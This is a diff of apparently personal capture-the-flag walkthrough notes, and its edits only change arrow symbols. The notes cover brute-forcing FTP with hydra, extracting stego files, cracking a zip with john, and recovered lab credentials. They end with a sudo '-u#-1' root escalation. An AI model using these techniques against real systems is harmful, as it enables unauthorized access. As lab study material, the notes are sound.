@@ -15,25 +15,25 @@
 		- noting
 	- HINT:
 		- intercept request - change user-agent
-		- => **username: chris**
+		- → **username: chris**
 
 - ftp
 	- not anon
 	- try to breach chris's password w/ hydra
-		- => **chris:crystal**
+		- → **chris:crystal**
 	- got 3 files:
 		- txt with instructions, jpeg, png (stego)
 	- `foremost -x <steg_file>`
-		- -> zip password: **alien**
+		- → zip password: **alien**
 	- crack zip w/ john
-		- => **QXJlYTUx**
+		- → **QXJlYTUx**
 		- use for second steg file
 		- got second creds
 			- **james:hackerrules!**
 
 - ssh
 	- james's creds
-		- -> user flag
+		- → user flag
 	- privilege escalation
-		- `sudo l` -> (ALL, !root) /bin/bash
+		- `sudo l` → (ALL, !root) /bin/bash
 		- `sudo -u#-1 /bin/bash`  (1 not l)
